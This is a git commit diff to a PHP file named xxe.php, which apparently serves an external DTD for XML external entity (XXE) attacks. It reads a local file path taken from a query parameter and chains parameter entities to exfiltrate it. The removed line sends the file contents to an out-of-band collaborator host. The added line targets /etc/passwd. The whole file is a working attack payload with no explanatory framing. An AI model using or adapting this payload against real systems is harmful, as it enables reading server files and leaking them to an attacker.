b5ed45f238d0aa41853a1ccd97dc9f798cb3e807
Axitaaa <68896844+AxitaPatel2341@users.noreply.github.com>
2023-03-22 19:35:10 +0530

    Update xxe.php

--- xxe.php
+++ xxe.php
@@ -3,6 +3,6 @@ $dir = $_GET['dir'];
 ?>
 
 <!ENTITY % file SYSTEM "file:///<?php echo $dir;?>">
-<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM '87dpkg4u5be5xksd03i2g4pt9kfb33rs.oastify.com/?xxe=%file;'>">
+<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">
 %ext;
 %exfil;
